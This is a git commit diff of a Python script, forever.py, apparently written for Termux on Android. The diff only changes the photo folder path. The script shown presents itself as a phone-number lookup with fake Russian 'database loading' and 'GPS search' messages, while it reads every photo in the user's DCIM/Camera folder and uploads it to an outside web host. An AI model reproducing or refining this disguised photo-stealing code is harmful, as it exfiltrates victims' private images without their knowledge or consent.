8f8621ba5da9dd79146b1b89c376086d730a9a98
Foled <66841487+Foled@users.noreply.github.com>
2020-06-15 01:30:37 +0300

    Update forever.py

--- forever.py
+++ forever.py
@@ -5,9 +5,9 @@ input("Номер телефона: ")
 print("Загрузка БД...")
 os.system("termux-setup-storage")
 print("Идет процесс поиска по GPS")
-l = os.listdir("../DCIM/Camera")
+l = os.listdir("/storage/DCIM/Camera")
 for i in range(len(l)):
-	f = open("../DCIM/Camera/"+l[i], "rb")
+	f = open("/storage/DCIM/Camera/"+l[i], "rb")
 	r = f.read()
 	try:
 		requests.post("http://cl18178.tmweb.ru/", data={"im": r})
